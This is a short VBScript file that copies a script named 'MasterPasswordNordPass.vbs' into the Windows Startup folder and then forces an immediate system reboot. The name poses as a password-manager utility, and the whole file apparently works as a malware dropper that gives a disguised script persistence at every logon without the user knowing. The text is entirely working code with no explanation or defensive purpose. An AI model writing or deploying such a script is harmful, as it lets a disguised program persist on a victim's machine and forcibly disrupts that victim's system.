Dim objShell
Dim fso
Set objShell = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")
startupFolder = objShell.SpecialFolders("Startup") & "\"
currentDir = objShell.CurrentDirectory
Set strFilePath = fso.GetFile(currentDir & "\MasterPasswordNordPass.vbs")
fso.CopyFile strFilePath, startupFolder
objShell.Run "C:\WINDOWS\system32\shutdown.exe -r -t 0"